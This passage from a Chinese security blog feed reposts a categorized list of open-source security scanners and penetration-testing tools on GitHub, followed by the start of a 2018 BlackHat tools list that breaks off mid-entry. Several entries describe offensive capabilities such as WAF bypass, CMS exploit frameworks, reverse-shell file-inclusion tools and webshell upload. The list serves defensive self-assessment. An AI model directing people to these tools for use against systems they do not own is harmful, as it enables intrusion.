href="https://github.com/ywolf/F-MiddlewareScan" target="_blank" rel="noopener">https://github.com/ywolf/F-MiddlewareScan</a> （中间件扫描）</li><li><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a> (web路径收集与扫描)</li><li><a href="https://github.com/x0day/bannerscan" target="_blank" rel="noopener">https://github.com/x0day/bannerscan</a> （C段Banner与路径扫描）</li><li><a href="https://github.com/RASSec/RASscan" target="_blank" rel="noopener">https://github.com/RASSec/RASscan</a> (端口服务扫描)</li><li><a href="https://github.com/3xp10it/bypass_waf" target="_blank" rel="noopener">https://github.com/3xp10it/bypass_waf</a> （waf自动暴破）</li><li><a href="https://github.com/3xp10it/xcdn" target="_blank" rel="noopener">https://github.com/3xp10it/xcdn</a> (尝试找出cdn背后的真实ip)  </li><li><a href="https://github.com/Xyntax/BingC" target="_blank" rel="noopener">https://github.com/Xyntax/BingC</a> （基于Bing搜索引擎的C段/旁站查询，多线程，支持API）</li><li><a href="https://github.com/Xyntax/DirBrute" target="_blank" rel="noopener">https://github.com/Xyntax/DirBrute</a> （多线程WEB目录爆破工具）</li><li><a href="https://github.com/zer0h/httpscan" target="_blank" rel="noopener">https://github.com/zer0h/httpscan</a> （一个爬虫式的网段Web主机发现小工具）</li><li><a href="https://github.com/lietdai/doom" target="_blank" rel="noopener">https://github.com/lietdai/doom</a> （Thorn上实现的分布式任务分发的ip端口漏洞扫描器）</li><li><a href="https://github.com/chichou/grab.js" target="_blank" rel="noopener">https://github.com/chichou/grab.js</a> (类似 zgrab 的快速 TCP 指纹抓取解析工具，支持更多协议)</li><li><a href="https://github.com/Nitr4x/whichCDN" target="_blank" rel="noopener">https://github.com/Nitr4x/whichCDN</a> (CDN识别、检测）</li><li><a href="https://github.com/secfree/bcrpscan" target="_blank" rel="noopener">https://github.com/secfree/bcrpscan</a> (基于爬虫的web路径扫描器)</li><li><a href="https://github.com/mozilla/ssh_scan" target="_blank" rel="noopener">https://github.com/mozilla/ssh_scan</a> (服务器ssh配置信息扫描）</li><li><a href="https://github.com/18F/domain-scan" target="_blank" rel="noopener">https://github.com/18F/domain-scan</a> (针对域名及其子域名的资产数据检测／扫描，包括http/https检测等）</li><li><a href="https://github.com/ggusoft/inforfinder" target="_blank" rel="noopener">https://github.com/ggusoft/inforfinder</a> (域名资产收集及指纹识别工具）</li><li><a href="https://github.com/boy-hack/gwhatweb" target="_blank" rel="noopener">https://github.com/boy-hack/gwhatweb</a> (CMS识别 python gevent实现)</li><li><a href="https://github.com/Mosuan/FileScan" target="_blank" rel="noopener">https://github.com/Mosuan/FileScan</a> (敏感文件扫描 / 二次判断降低误报率 / 扫描内容规则化 / 多目录扫描)</li><li><a href="https://github.com/Xyntax/FileSensor" target="_blank" rel="noopener">https://github.com/Xyntax/FileSensor</a> (基于爬虫的动态敏感文件探测工具)</li><li><a href="https://github.com/deibit/cansina" target="_blank" rel="noopener">https://github.com/deibit/cansina</a> (web路径扫描工具）</li><li><a href="https://github.com/0xbug/Howl" target="_blank" rel="noopener">https://github.com/0xbug/Howl</a> (网络设备 web 服务指纹扫描与检索)</li><li><a href="https://github.com/mozilla/cipherscan" target="_blank" rel="noopener">https://github.com/mozilla/cipherscan</a> (目标主机服务ssl类型识别)</li><li><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a> (Web应用fuzz工具、框架，同时可用于web路径/服务扫描）</li><li><a href="https://github.com/s0md3v/Breacher" target="_blank" rel="noopener">https://github.com/s0md3v/Breacher</a> (多线程的后台路径扫描器，也可用于发现Execution After Redirect漏洞）</li><li><a href="https://github.com/ztgrace/changeme" target="_blank" rel="noopener">https://github.com/ztgrace/changeme</a> (弱口令扫描器，不仅支持普通登录页，也支持ssh、mongodb等组件）</li><li><a href="https://github.com/medbenali/CyberScan" target="_blank" rel="noopener">https://github.com/medbenali/CyberScan</a> (渗透测试辅助工具，支持分析数据包、解码、端口扫描、IP地址分析等）</li><li><a href="https://github.com/m0nad/HellRaiser" target="_blank" rel="noopener">https://github.com/m0nad/HellRaiser</a> (基于nmap的扫描器，与cve漏洞关联）</li><li><a href="https://github.com/scipag/vulscan" target="_blank" rel="noopener">https://github.com/scipag/vulscan</a> (基于nmap的高级漏洞扫描器，命令行环境使用）</li><li><a href="https://github.com/jekyc/wig" target="_blank" rel="noopener">https://github.com/jekyc/wig</a> (web应用信息搜集工具）</li><li><a href="https://github.com/eldraco/domain_analyzer" target="_blank" rel="noopener">https://github.com/eldraco/domain_analyzer</a> (围绕web服务的域名进行信息收集和”域传送”等漏洞扫描，也支持针对背后的服务器端口扫描等）</li><li><a href="https://github.com/cloudtracer/paskto" target="_blank" rel="noopener">https://github.com/cloudtracer/paskto</a> (基于Nikto扫描规则的被动式路径扫描以及信息爬虫）</li><li><a href="https://github.com/zerokeeper/WebEye" target="_blank" rel="noopener">https://github.com/zerokeeper/WebEye</a> (快速识别WEB服务器类型、CMS类型、WAF类型、WHOIS信息、以及语言框架)</li><li><a href="https://github.com/m3liot/shcheck" target="_blank" rel="noopener">https://github.com/m3liot/shcheck</a> (用于检查web服务的http header的安全性)</li><li><a href="https://github.com/aipengjie/sensitivefilescan" target="_blank" rel="noopener">https://github.com/aipengjie/sensitivefilescan</a> (一款高效快捷的敏感文件扫描工具）</li><li><a href="https://github.com/fnk0c/cangibrina" target="_blank" rel="noopener">https://github.com/fnk0c/cangibrina</a> (通过字典穷举、google、robots.txt等途径的跨平台后台管理路径扫描器）</li><li><a href="https://github.com/n4xh4ck5/CMSsc4n" target="_blank" rel="noopener">https://github.com/n4xh4ck5/CMSsc4n</a> (常规CMS指纹识别）</li><li><a href="https://github.com/Ekultek/WhatWaf" target="_blank" rel="noopener">https://github.com/Ekultek/WhatWaf</a> （WAF指纹识别及自动化bypass工具）</li><li><a href="https://github.com/dzonerzy/goWAPT" target="_blank" rel="noopener">https://github.com/dzonerzy/goWAPT</a> (Web应用fuzz工具、框架，同时可用于web路径/服务扫描)</li><li><a href="https://github.com/blackye/webdirdig" target="_blank" rel="noopener">https://github.com/blackye/webdirdig</a> (web敏感目录/信息泄漏扫描脚本)</li><li><a href="https://github.com/GitHackTools/BillCipher" target="_blank" rel="noopener">https://github.com/GitHackTools/BillCipher</a> (用于网站或IP地址的信息收集工具)</li><li><a href="https://github.com/boy-hack/w8fuckcdn" target="_blank" rel="noopener">https://github.com/boy-hack/w8fuckcdn</a> (通过扫描全网获得真实IP的自动化程序)</li><li><a href="https://github.com/boy-hack/w11scan" target="_blank" rel="noopener">https://github.com/boy-hack/w11scan</a> (分布式WEB指纹识别平台)</li><li><a href="https://github.com/Nekmo/dirhunt" target="_blank" rel="noopener">https://github.com/Nekmo/dirhunt</a> (爬虫式web目录扫描工具)</li><li><a href="https://github.com/MetaChar/pyHAWK" target="_blank" rel="noopener">https://github.com/MetaChar/pyHAWK</a> (数据库文件、私钥等敏感文件泄露扫描)</li></ul><h4 id="专用（即特定性针对某些组件）扫描器"><a href="#专用（即特定性针对某些组件）扫描器" class="headerlink" title="专用（即特定性针对某些组件）扫描器"></a>专用（即特定性针对某些组件）扫描器</h4><ul><li><a href="https://github.com/blackye/Jenkins" target="_blank" rel="noopener">https://github.com/blackye/Jenkins</a> (Jenkins漏洞探测、用户抓取爆破)</li><li><a href="https://github.com/code-scan/dzscan" target="_blank" rel="noopener">https://github.com/code-scan/dzscan</a> (首款集成化的Discuz扫描工具)</li><li><a href="https://github.com/chuhades/CMS-Exploit-Framework" target="_blank" rel="noopener">https://github.com/chuhades/CMS-Exploit-Framework</a> (一款简洁优雅的CMS扫描利用框架)</li><li><a href="https://github.com/lijiejie/IIS_shortname_Scanner" target="_blank" rel="noopener">https://github.com/lijiejie/IIS_shortname_Scanner</a> （IIS短文件名暴力枚举漏洞利用工具)</li><li><a href="https://github.com/riusksk/FlashScanner" target="_blank" rel="noopener">https://github.com/riusksk/FlashScanner</a> (flashxss扫描)</li><li><a href="https://github.com/coffeehb/SSTIF" target="_blank" rel="noopener">https://github.com/coffeehb/SSTIF</a> （一个Fuzzing服务器端模板注入漏洞的半自动化工具）</li><li><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a> (服务器端模板注入漏洞检测与利用工具)</li><li><a href="https://github.com/cr0hn/dockerscan" target="_blank" rel="noopener">https://github.com/cr0hn/dockerscan</a> (Docker扫描工具)</li><li><a href="https://github.com/m4ll0k/WPSeku" target="_blank" rel="noopener">https://github.com/m4ll0k/WPSeku</a> (一款精简的wordpress扫描工具)</li><li><a href="https://github.com/rastating/wordpress-exploit-framework" target="_blank" rel="noopener">https://github.com/rastating/wordpress-exploit-framework</a> (集成化wordpress漏洞利用框架)</li><li><a href="https://github.com/ilmila/J2EEScan" target="_blank" rel="noopener">https://github.com/ilmila/J2EEScan</a> (用于扫描J2EE应用的一款burpsuite插件)</li><li><a href="https://github.com/riusksk/StrutScan" target="_blank" rel="noopener">https://github.com/riusksk/StrutScan</a> (一款基于perl的strut2的历史漏洞扫描器)</li><li><a href="https://github.com/D35m0nd142/LFISuite" target="_blank" rel="noopener">https://github.com/D35m0nd142/LFISuite</a> (本地文件包含漏洞利用及扫描工具，支持反弹shell)</li><li><a href="https://github.com/0x4D31/salt-scanner" target="_blank" rel="noopener">https://github.com/0x4D31/salt-scanner</a> (基于Salt Open以及Vulners Linux Audit API的linux漏洞扫描器，支持与JIRA、slack平台结合使用)</li><li><a href="https://github.com/tijme/angularjs-csti-scanner" target="_blank" rel="noopener">https://github.com/tijme/angularjs-csti-scanner</a> (自动化探测客户端AngularJS模板注入漏洞工具)</li><li><a href="https://github.com/irsdl/IIS-ShortName-Scanner" target="_blank" rel="noopener">https://github.com/irsdl/IIS-ShortName-Scanner</a> (Java编写的IIS短文件名暴力枚举漏洞利用工具)</li><li><a href="https://github.com/swisskyrepo/Wordpresscan" target="_blank" rel="noopener">https://github.com/swisskyrepo/Wordpresscan</a> (基于WPScan以及WPSeku的优化版wordpress扫描器)</li><li><a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="noopener">https://github.com/CHYbeta/cmsPoc</a> (CMS渗透测试框架）</li><li><a href="https://github.com/rudSarkar/crlf-injector" target="_blank" rel="noopener">https://github.com/rudSarkar/crlf-injector</a> (CRLF注入漏洞批量扫描）</li><li><a href="https://github.com/3gstudent/Smbtouch-Scanner" target="_blank" rel="noopener">https://github.com/3gstudent/Smbtouch-Scanner</a> (自动化扫描内网中存在的由shadow brokers泄露的ETERNAL系列漏洞)</li><li><a href="https://github.com/utiso/dorkbot" target="_blank" rel="noopener">https://github.com/utiso/dorkbot</a> （通过定制化的谷歌搜索引擎进行漏洞页面搜寻及扫描）</li><li><a href="https://github.com/OsandaMalith/LFiFreak" target="_blank" rel="noopener">https://github.com/OsandaMalith/LFiFreak</a> （本地文件包含漏洞利用及扫描工具，支持反弹shell)</li><li><a href="https://github.com/mak-/parameth" target="_blank" rel="noopener">https://github.com/mak-/parameth</a> (用于枚举脚本的GET/POST未知参数字段）</li><li><a href="https://github.com/Lucifer1993/struts-scan" target="_blank" rel="noopener">https://github.com/Lucifer1993/struts-scan</a> (struts2漏洞全版本检测和利用工具)</li><li><a href="https://github.com/hahwul/a2sv" target="_blank" rel="noopener">https://github.com/hahwul/a2sv</a> (SSL漏洞扫描，例如心脏滴血漏洞等）</li><li><a href="https://github.com/NullArray/DorkNet" target="_blank" rel="noopener">https://github.com/NullArray/DorkNet</a> (基于搜索引擎的漏洞网页搜寻）</li><li><a href="https://github.com/NickstaDB/BaRMIe" target="_blank" rel="noopener">https://github.com/NickstaDB/BaRMIe</a> (用于攻击爆破Java Remote Method Invocation服务的工具)</li><li><a href="https://github.com/RetireJS/grunt-retire" target="_blank" rel="noopener">https://github.com/RetireJS/grunt-retire</a> (扫描js扩展库的常见漏洞）</li><li><a href="https://github.com/kotobukki/BDA" target="_blank" rel="noopener">https://github.com/kotobukki/BDA</a> (针对hadoop/spark等大数据平台的的漏洞探测工具）</li><li><a href="https://github.com/jagracey/Regex-DoS" target="_blank" rel="noopener">https://github.com/jagracey/Regex-DoS</a> (RegEx 拒绝服务扫描器)</li><li><a href="https://github.com/milesrichardson/docker-onion-nmap" target="_blank" rel="noopener">https://github.com/milesrichardson/docker-onion-nmap</a> (使用nmap扫描Tor网络上隐藏的”onion”服务)</li><li><a href="https://github.com/Moham3dRiahi/XAttacker" target="_blank" rel="noopener">https://github.com/Moham3dRiahi/XAttacker</a> (Web CMS Exploit 工具,包含针对主流 CMS 的 66 个不同的 Exploits)</li><li><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a> (一个迷你的信息泄漏批量扫描脚本)</li><li><a href="https://github.com/almandin/fuxploider" target="_blank" rel="noopener">https://github.com/almandin/fuxploider</a> (文件上传漏洞扫描器及利用工具）</li><li><a href="https://github.com/Ice3man543/SubOver" target="_blank" rel="noopener">https://github.com/Ice3man543/SubOver</a> (子域名接管漏洞检测工具，支持30+云服务托管检测)</li><li><a href="https://github.com/Jamalc0m/wphunter" target="_blank" rel="noopener">https://github.com/Jamalc0m/wphunter</a> (Wordpress漏洞扫描器,同时也支持敏感文件泄露扫描)</li><li><a href="https://github.com/retirejs/retire.js" target="_blank" rel="noopener">https://github.com/retirejs/retire.js</a> (检测网站依赖的JavaScript库中存在的已知通用漏洞)</li><li><a href="https://github.com/3xp10it/xupload" target="_blank" rel="noopener">https://github.com/3xp10it/xupload</a> (自动检测上传功能是否可上传webshell)</li><li><a href="https://github.com/mobrine-mob/M0B-tool" target="_blank" rel="noopener">https://github.com/mobrine-mob/M0B-tool</a> （CMS指纹识别及自动化渗透测试框架）</li><li><a href="https://github.com/rezasp/vbscan" target="_blank" rel="noopener">https://github.com/rezasp/vbscan</a> (论坛框架vBulletin黑盒漏洞扫描器)</li><li><a href="https://github.com/MrSqar-Ye/BadMod" target="_blank" rel="noopener">https://github.com/MrSqar-Ye/BadMod</a> (CMS指纹识别及自动化渗透测试框架)</li><li><a href="https://github.com/Tuhinshubhra/CMSeeK" target="_blank" rel="noopener">https://github.com/Tuhinshubhra/CMSeeK</a> (CMS漏洞检测和利用套件)</li><li><a href="https://github.com/cloudsploit/scans" target="_blank" rel="noopener">https://github.com/cloudsploit/scans</a> (AWS安全审计工具)</li><li><a href="https://github.com/radenvodka/SVScanner" target="_blank" rel="noopener">https://github.com/radenvodka/SVScanner</a> (针对wp、magento、joomla等CMS的漏洞扫描器及自动利用工具)</li><li><a href="https://github.com/rezasp/joomscan" target="_blank" rel="noopener">https://github.com/rezasp/joomscan</a> (OWASP旗下joomla漏洞扫描项目)</li><li><a href="https://github.com/6IX7ine/djangohunter" target="_blank" rel="noopener">https://github.com/6IX7ine/djangohunter</a> (用于检测因错误配置导致敏感信息暴露的Django应用程序)</li></ul><h4 id="无线网络（审计）扫描器"><a href="#无线网络（审计）扫描器" class="headerlink" title="无线网络（审计）扫描器"></a>无线网络（审计）扫描器</h4><ul><li><a href="https://github.com/savio-code/fern-wifi-cracker/" target="_blank" rel="noopener">https://github.com/savio-code/fern-wifi-cracker/</a> (无线安全审计工具)</li><li><a href="https://github.com/m4n3dw0lf/PytheM" target="_blank" rel="noopener">https://github.com/m4n3dw0lf/PytheM</a> （Python网络/渗透测试工具）</li><li><a href="https://github.com/P0cL4bs/WiFi-Pumpkin" target="_blank" rel="noopener">https://github.com/P0cL4bs/WiFi-Pumpkin</a> （无线安全渗透测试套件）</li><li><a href="https://github.com/MisterBianco/BoopSuite" target="_blank" rel="noopener">https://github.com/MisterBianco/BoopSuite</a> (无线网络审计工具，支持2-5GHZ频段）</li><li><a href="https://github.com/DanMcInerney/LANs.py" target="_blank" rel="noopener">https://github.com/DanMcInerney/LANs.py</a> (ARP欺骗，无线网络劫持）</li><li><a href="https://github.com/besimaltnok/PiFinger" target="_blank" rel="noopener">https://github.com/besimaltnok/PiFinger</a> (检查wifi是否是”大菠萝”所开放的热点，并给予网络评分）</li><li><a href="https://github.com/derv82/wifite2" target="_blank" rel="noopener">https://github.com/derv82/wifite2</a> （自动化无线网络攻击工具wifite的重构版本）</li></ul><h4 id="局域网络（本地网络）扫描器"><a href="#局域网络（本地网络）扫描器" class="headerlink" title="局域网络（本地网络）扫描器"></a>局域网络（本地网络）扫描器</h4><ul><li><a href="https://github.com/sowish/LNScan" target="_blank" rel="noopener">https://github.com/sowish/LNScan</a> (基于BBScan via.lijiejie的本地网络扫描)</li><li><a href="https://github.com/niloofarkheirkhah/nili" target="_blank" rel="noopener">https://github.com/niloofarkheirkhah/nili</a> （网络扫描，中间人攻击，协议检测与逆向）</li><li><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="noopener">https://github.com/SkyLined/LocalNetworkScanner</a> （基于javascript的本地网络扫描)</li><li><a href="https://github.com/rootlabs/nWatch" target="_blank" rel="noopener">https://github.com/rootlabs/nWatch</a> (基于网卡ip地址段的本地主机扫描、主机端口扫描、指纹识别)</li></ul><h4 id="代码审计工具或扫描器"><a href="#代码审计工具或扫描器" class="headerlink" title="代码审计工具或扫描器"></a>代码审计工具或扫描器</h4><ul><li><a href="https://github.com/wufeifei/cobra" target="_blank" rel="noopener">https://github.com/wufeifei/cobra</a> (白盒代码安全审计系统)</li><li><a href="https://github.com/OneSourceCat/phpvulhunter" target="_blank" rel="noopener">https://github.com/OneSourceCat/phpvulhunter</a> (静态PHP代码审计)</li><li><a href="https://github.com/Qihoo360/phptrace" target="_blank" rel="noopener">https://github.com/Qihoo360/phptrace</a> (跟踪、分析PHP运行情况的工具）</li><li><a href="https://github.com/ajinabraham/NodeJsScan" target="_blank" rel="noopener">https://github.com/ajinabraham/NodeJsScan</a> (NodeJS应用代码审计）</li><li><a href="https://github.com/shengqi158/pyvulhunter" target="_blank" rel="noopener">https://github.com/shengqi158/pyvulhunter</a> （Python应用审计）</li><li><a href="https://github.com/presidentbeef/brakeman" target="_blank" rel="noopener">https://github.com/presidentbeef/brakeman</a> ( Ruby on Rails应用静态代码分析）</li><li><a href="https://github.com/python-security/pyt" target="_blank" rel="noopener">https://github.com/python-security/pyt</a> (Python应用静态代码审计）</li><li><a href="https://github.com/m4ll0k/WPSploit" target="_blank" rel="noopener">https://github.com/m4ll0k/WPSploit</a> (Wordpress插件代码安全审计）</li><li><a href="https://github.com/emanuil/php-reaper" target="_blank" rel="noopener">https://github.com/emanuil/php-reaper</a> (用于扫描PHP应用程序中可能存在SQL漏洞的ADOdb代码）</li><li><a href="https://github.com/lowjoel/phortress" target="_blank" rel="noopener">https://github.com/lowjoel/phortress</a> (用于检测潜在安全漏洞的PHP静态代码分析工具）</li></ul><h4 id="模块化设计扫描器或漏洞检测框架"><a href="#模块化设计扫描器或漏洞检测框架" class="headerlink" title="模块化设计扫描器或漏洞检测框架"></a>模块化设计扫描器或漏洞检测框架</h4><ul><li><a href="https://github.com/az0ne/AZScanner" target="_blank" rel="noopener">https://github.com/az0ne/AZScanner</a> (自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测)</li><li><a href="https://github.com/blackye/lalascan" target="_blank" rel="noopener">https://github.com/blackye/lalascan</a> (集合owasp top10漏洞扫描和边界资产发现能力的分布式web漏洞扫描框架)</li><li><a href="https://github.com/blackye/BkScanner" target="_blank" rel="noopener">https://github.com/blackye/BkScanner</a> (BkScanner 分布式、插件化web漏洞扫描器)</li><li><a href="https://github.com/ysrc/GourdScanV2" target="_blank" rel="noopener">https://github.com/ysrc/GourdScanV2</a> （ysrc出品的被动式漏洞扫描工具)</li><li><a href="https://github.com/netxfly/passive_scan" target="_blank" rel="noopener">https://github.com/netxfly/passive_scan</a> (基于http代理的web漏洞扫描器)</li><li><a href="https://github.com/1N3/Sn1per" target="_blank" rel="noopener">https://github.com/1N3/Sn1per</a> (自动化扫描器，包括中间件扫描以及设备指纹识别)</li><li><a href="https://github.com/RASSec/pentestEr_Fully-automatic-scanner" target="_blank" rel="noopener">https://github.com/RASSec/pentestEr_Fully-automatic-scanner</a> （定向全自动化渗透测试工具）</li><li><a href="https://github.com/3xp10it/3xp10it" target="_blank" rel="noopener">https://github.com/3xp10it/3xp10it</a> （自动化渗透测试框架，支持cdn真实ip查找、指纹识别等)</li><li><a href="https://github.com/Lcys/lcyscan" target="_blank" rel="noopener">https://github.com/Lcys/lcyscan</a> (python插件化漏洞扫描器，支持生成扫描报表）</li><li><a href="https://github.com/Xyntax/POC-T" target="_blank" rel="noopener">https://github.com/Xyntax/POC-T</a> （渗透测试插件化并发框架）</li><li><a href="https://github.com/v3n0m-Scanner/V3n0M-Scanner" target="_blank" rel="noopener">https://github.com/v3n0m-Scanner/V3n0M-Scanner</a> （支持检测SQLi/XSS/LFI/RFI等漏洞的扫描器）</li><li><a href="https://github.com/Skycrab/leakScan" target="_blank" rel="noopener">https://github.com/Skycrab/leakScan</a> （Web图形化的的漏洞扫描框架）</li><li><a href="https://github.com/zhangzhenfeng/AnyScan" target="_blank" rel="noopener">https://github.com/zhangzhenfeng/AnyScan</a> (一款web化的自动化渗透测试框架)</li><li><a href="https://github.com/Tuhinshubhra/RED_HAWK" target="_blank" rel="noopener">https://github.com/Tuhinshubhra/RED_HAWK</a> (一款集成信息收集、漏洞扫描、指纹识别等的多合一扫描工具）</li><li><a href="https://github.com/Arachni/arachni" target="_blank" rel="noopener">https://github.com/Arachni/arachni</a> (高度集成化的Web应用漏洞扫描框架，支持REST、RPC等api调用）</li><li><a href="https://github.com/infobyte/faraday" target="_blank" rel="noopener">https://github.com/infobyte/faraday</a> （集成化渗透测试辅助平台及漏洞管理平台）</li><li><a href="https://github.com/juansacco/exploitpack" target="_blank" rel="noopener">https://github.com/juansacco/exploitpack</a> (渗透测试集成框架，包含超过38,000+ exploits)</li><li><a href="https://github.com/swisskyrepo/DamnWebScanner" target="_blank" rel="noopener">https://github.com/swisskyrepo/DamnWebScanner</a> （基于chrome/opera插件的被动式漏洞扫描）</li><li><a href="https://github.com/anilbaranyelken/tulpar" target="_blank" rel="noopener">https://github.com/anilbaranyelken/tulpar</a> (支持多种web漏洞扫描，命令行环境使用）</li><li><a href="https://github.com/m4ll0k/Spaghetti" target="_blank" rel="noopener">https://github.com/m4ll0k/Spaghetti</a> (web应用扫描器，支持指纹识别、文件目录爆破、SQL/XSS/RFI等漏洞扫描，也可直接用于struts、ShellShock等扫描)</li><li><a href="https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest" target="_blank" rel="noopener">https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest</a> (集成子域名枚举、nmap、waf指纹识别等模块的web应用扫描器）</li><li><a href="https://github.com/0xsauby/yasuo" target="_blank" rel="noopener">https://github.com/0xsauby/yasuo</a> (使用ruby开发的扫描网络中主机存在的第三方web应用服务漏洞）</li><li><a href="https://github.com/hatRiot/clusterd" target="_blank" rel="noopener">https://github.com/hatRiot/clusterd</a> (Web应用自动化扫描框架,支持自动化上传webshell)</li><li><a href="https://github.com/erevus-cn/pocscan" target="_blank" rel="noopener">https://github.com/erevus-cn/pocscan</a> （一款开源 Poc 调用框架,可轻松调用Pocsuite,Tangscan,Beebeeto,Knowsec老版本POC，可使用docker部署）</li><li><a href="https://github.com/TophantTechnology/osprey" target="_blank" rel="noopener">https://github.com/TophantTechnology/osprey</a> (斗象能力中心出品并长期维护的开源漏洞检测框架)</li><li><a href="https://github.com/yangbh/Hammer" target="_blank" rel="noopener">https://github.com/yangbh/Hammer</a> (Web应用漏洞扫描框架)</li><li><a href="https://github.com/Lucifer1993/AngelSword" target="_blank" rel="noopener">https://github.com/Lucifer1993/AngelSword</a> (Web应用漏洞扫描框架,基于python3)</li><li><a href="https://github.com/secrary/EllaScanner" target="_blank" rel="noopener">https://github.com/secrary/EllaScanner</a> (被动式漏洞扫描，支持历史cve编号漏洞识别)</li><li><a href="https://github.com/zaproxy/zaproxy" target="_blank" rel="noopener">https://github.com/zaproxy/zaproxy</a> (The OWASP ZAP core project出品的综合性渗透测试工具）</li><li><a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">https://github.com/sullo/nikto</a> (Web服务综合型扫描器，用于指定目标的资产收集、安全配置缺陷或者安全漏洞扫描）</li><li><a href="https://github.com/s0md3v/Striker" target="_blank" rel="noopener">https://github.com/s0md3v/Striker</a> (一款多方位信息收集、指纹识别及漏洞扫描工具）</li><li><a href="https://github.com/dermotblair/webvulscan" target="_blank" rel="noopener">https://github.com/dermotblair/webvulscan</a> (一款web应用漏洞扫描器，支持扫描反射型以及存储型xss、sql injection等漏洞，支持输出pdf报告)</li><li><a href="https://github.com/alienwithin/OWASP-mth3l3m3nt-framework" target="_blank" rel="noopener">https://github.com/alienwithin/OWASP-mth3l3m3nt-framework</a> (渗透测试辅助工具，综合利用框架）</li><li><a href="https://github.com/toyakula/luna" target="_blank" rel="noopener">https://github.com/toyakula/luna</a> (基于被动式扫描框架的自动化web漏洞扫描工具）</li><li><a href="https://github.com/Manisso/fsociety" target="_blank" rel="noopener">https://github.com/Manisso/fsociety</a> (渗透测试辅助框架，包含信息搜集、无线渗透、web应用扫描等功能)</li><li><a href="https://github.com/boy-hack/w9scan" target="_blank" rel="noopener">https://github.com/boy-hack/w9scan</a> (内置1200+插件的web漏洞扫描框架)</li><li><a href="https://github.com/YalcinYolalan/WSSAT" target="_blank" rel="noopener">https://github.com/YalcinYolalan/WSSAT</a> (Web服务安全评估工具,提供基于windows操作系统的简单.exe应用)</li><li><a href="https://github.com/AmyangXYZ/AssassinGo" target="_blank" rel="noopener">https://github.com/AmyangXYZ/AssassinGo</a> (使用Go开发的可扩展以及高并发渗透测试框架)</li><li><a href="https://github.com/jeffzh3ng/InsectsAwake" target="_blank" rel="noopener">https://github.com/jeffzh3ng/InsectsAwake</a> (基于 Flask 应用框架的漏洞扫描系统)</li><li><a href="https://github.com/m4ll0k/Galileo" target="_blank" rel="noopener">https://github.com/m4ll0k/Galileo</a> (一个操作上类似metasploit的web应用安全审计框架)</li><li><a href="https://github.com/joker25000/Optiva-Framework" target="_blank" rel="noopener">https://github.com/joker25000/Optiva-Framework</a> (一款web应用漏洞扫描器，支持扫描反射型以及存储型xss、sql injection等漏洞)</li><li><a href="https://github.com/theInfectedDrake/TIDoS-Framework" target="_blank" rel="noopener">https://github.com/theInfectedDrake/TIDoS-Framework</a> (集成104个模块的Web应用程序渗透测试框架)</li></ul><h4 id="高级持续性威胁-APT-相关工具"><a href="#高级持续性威胁-APT-相关工具" class="headerlink" title="高级持续性威胁(APT)相关工具"></a>高级持续性威胁(APT)相关工具</h4><ul><li><a href="https://github.com/Neo23x0/Loki" target="_blank" rel="noopener">https://github.com/Neo23x0/Loki</a> (一款APT入侵痕迹扫描器)</li></ul><h4 id="工控系统-amp-大型网络相关安全工具"><a href="#工控系统-amp-大型网络相关安全工具" class="headerlink" title="工控系统&amp;大型网络相关安全工具"></a>工控系统&amp;大型网络相关安全工具</h4><ul><li><a href="https://github.com/w3h/icsmaster/tree/master/nse" target="_blank" rel="noopener">https://github.com/w3h/icsmaster/tree/master/nse</a> （ICS设备nmap扫描脚本)</li><li><a href="https://github.com/OpenNetworkingFoundation/DELTA" target="_blank" rel="noopener">https://github.com/OpenNetworkingFoundation/DELTA</a> （SDN安全评估框架）</li></ul><hr><h3 id="收集目的"><a href="#收集目的" class="headerlink" title="收集目的"></a>收集目的</h3><p>本仓库收集的初衷是为向各类企业安全从业人员提供在企业信息安全防护体系建设过程中可以参考的开源安全扫描工具，以期望企业能够利用这些扫描器对自身业务进行自检，从而提高自身业务安全性</p><blockquote><p>项目地址：<code>https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md</code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具介绍 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018-BlackHat-Tools-List</title>
      <link href="/2018/12/24/2018-blackhat-tools-list/"/>
      <url>/2018/12/24/2018-blackhat-tools-list/</url>
      
        <content type="html"><![CDATA[<p>2018 BlackHat Tools List</p><p>Android，iOS和移动黑客</p><p>易受攻击的iOS应用程序：Swift版</p><p><a href="https://github.com/prateek147/DVIA-v2" target="_blank" rel="noopener">https://github.com/prateek147/DVIA-v2</a></p><p>代码评估</p><p>OWASP依赖性检查</p><p><a href="https://github.com/jeremylong/DependencyCheck" target="_blank" rel="noopener">https://github.com/jeremylong/DependencyCheck</a></p><p>美洲狮扫描</p><p><a href="https://github.com/pumasecurity/puma-scan" target="_blank" rel="noopener">https://github.com/pumasecurity/puma-scan</a></p><p>加密</p><p>DeepViolet：SSL / TLS扫描API和工具</p><p><a href="https://github.com/spoofzu/DeepViolet" target="_blank" rel="noopener">https://github.com/spoofzu/DeepViolet</a></p><p>数据取证和事件响应</p><p>初学者到专家</p><p><a href="https://github.com/bro/bro" target="_blank" rel="noopener">https://github.com/bro/bro</a></p><p>CyBot：开源威胁情报聊天机器人</p><p><a href="https://github.com/CylanceSPEAR/CyBot" target="_blank" rel="noopener">https://github.com/CylanceSPEAR/CyBot</a></p><p>LogonTracer</p><p><a href="https://github.com/JPCERTCC/LogonTracer" target="_blank" rel="noopener">https://github.com/JPCERTCC/LogonTracer</a></p><p>rastrea2r（重新加载！）：用Gusto和Style收集和狩猎IOC</p><p><a href="https://github.com/rastrea2r/rastrea2r" target="_blank" rel="noopener">https://github.com/rastrea2r/rastrea2r</a></p><p>RedHunt OS（VM）：用于对手仿真和威胁搜索的虚拟机</p><p><a href="https://github.com/redhuntlabs/RedHunt-OS" target="_blank" 